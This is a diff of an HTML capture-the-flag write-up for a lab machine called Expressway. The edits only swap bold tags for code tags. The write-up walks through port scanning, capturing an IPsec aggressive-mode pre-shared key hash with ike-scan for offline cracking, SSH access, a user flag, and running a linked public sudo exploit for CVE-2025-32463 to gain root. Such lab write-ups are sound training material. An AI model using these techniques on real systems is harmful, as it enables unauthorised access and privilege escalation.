@@ -84,7 +84,7 @@
     <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
       <h2 class="writeup-section-title">Machine Overview</h2>
-      <p>Expressway is a Medium difficulty Linux machine that exposes an <strong>IPsec/IKE VPN</strong> service on UDP port 500. The attack path involves fingerprinting the IKE implementation, capturing and cracking the pre-shared key (PSK), and using the recovered credentials for SSH access. Privilege escalation is achieved through <strong>CVE-2025-32463</strong>, a local privilege escalation vulnerability.</p>
+      <p>Expressway is a Medium difficulty Linux machine that exposes an <code>IPsec/IKE VPN</code> service on UDP port 500. The attack path involves fingerprinting the IKE implementation, capturing and cracking the pre-shared key (PSK), and using the recovered credentials for SSH access. Privilege escalation is achieved through <code>CVE-2025-32463</code>, a local privilege escalation vulnerability.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
       <p>I start with a full port scan to identify all open ports.</p>
@@ -124,7 +124,7 @@ PORT    STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds</code></pre></div>
       <h2 class="writeup-section-title">Foothold: IPsec/IKE VPN Exploitation</h2>
       <h3 class="writeup-sub-title">Understanding IPsec</h3>
-      <p><strong>IPsec</strong> (Internet Protocol Security) is a protocol suite for securing IP communications through authentication and encryption. It operates in two phases: <strong>Phase 1</strong> establishes a secure channel and verifies identity using credentials (username/password or certificates), while <strong>Phase 2</strong> configures the parameters for securing data using ESP (Encapsulating Security Payload).</p>
+      <p><code>IPsec</code> (Internet Protocol Security) is a protocol suite for securing IP communications through authentication and encryption. It operates in two phases: <code>Phase 1</code> establishes a secure channel and verifies identity using credentials (username/password or certificates), while <code>Phase 2</code> configures the parameters for securing data using ESP (Encapsulating Security Payload).</p>
       <h3 class="writeup-sub-title">IKE Fingerprinting</h3>
       <p>Since the detailed port scan was taking too long, I directly probed port 500 using the <code>ike-scan</code> tool. This tool sends IKE Phase 1 proposals to discover the VPN gateway's supported transforms and authentication methods.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Expressway]
@@ -142,7 +142,7 @@ Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/
 
 Ending ike-scan 1.9.6: 1 hosts scanned in 0.025 seconds (40.12 hosts/sec).  1 returned handshake; 0 returned notify</code></pre></div>
       <h3 class="writeup-sub-title">Pre-Shared Key Extraction</h3>
-      <p>Through aggressive-mode fingerprinting, I was able to capture the <strong>pre-shared key hash</strong>. In IKE aggressive mode, the responder sends its identity and hash in the first exchange — making it vulnerable to offline cracking.</p>
+      <p>Through aggressive-mode fingerprinting, I was able to capture the <code>pre-shared key hash</code>. In IKE aggressive mode, the responder sends its identity and hash in the first exchange — making it vulnerable to offline cracking.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Expressway]
 └─$ ike-scan -A --pskcrack 10.129.219.197
 Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
@@ -174,7 +174,7 @@ ike@expressway:~$</code></pre></div>
 364d1650268c1786f8d43cf1e42df4ad</code></pre></div>
       <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">364d1650268c1786f8d43cf1e42df4ad</code></div>
       <h2 class="writeup-section-title">Privilege Escalation: CVE-2025-32463</h2>
-      <p>I check for sudo misconfigurations with <code>sudo -l</code>, but nothing useful is found. I then upload and run <strong>linpeas</strong> for broader system enumeration.</p>
+      <p>I check for sudo misconfigurations with <code>sudo -l</code>, but nothing useful is found. I then upload and run <code>linpeas</code> for broader system enumeration.</p>
       <div class="code-block"><pre><code>ike@expressway:~$ ./linpeas_linux_amd64 
 
 ╔══════════╣ Sudo version
@@ -186,7 +186,7 @@ Sudo version 1.9.17
 strace Not Found                                                                                                   
 -rwsr-xr-x 1 root root 1.5M Aug 14 12:58 /usr/sbin/exim4                                                           
 -rwsr-xr-x 1 root root 1023K Aug 29 15:18 /usr/local/bin/sudo  ---&gt;  check_if_the_sudo_version_is_vulnerable</code></pre></div>
-      <p>Through research, I found <strong>CVE-2025-32463</strong>, a local privilege escalation vulnerability affecting this system. The exploit is available at: <a href="https://github.com/kh4sh3i/CVE-2025-32463." target="_blank" rel="noopener">https://github.com/kh4sh3i/CVE-2025-32463.</a></p>
+      <p>Through research, I found <code>CVE-2025-32463</code>, a local privilege escalation vulnerability affecting this system. The exploit is available at: <a href="https://github.com/kh4sh3i/CVE-2025-32463." target="_blank" rel="noopener">https://github.com/kh4sh3i/CVE-2025-32463.</a></p>
       <p>I download the exploit script to the target, set execute permissions, and run it. The exploit successfully escalates privileges to root.</p>
       <div class="code-block"><pre><code>ike@expressway:~$ chmod +x exploit.sh
 ike@expressway:~$ ./exploit.sh 
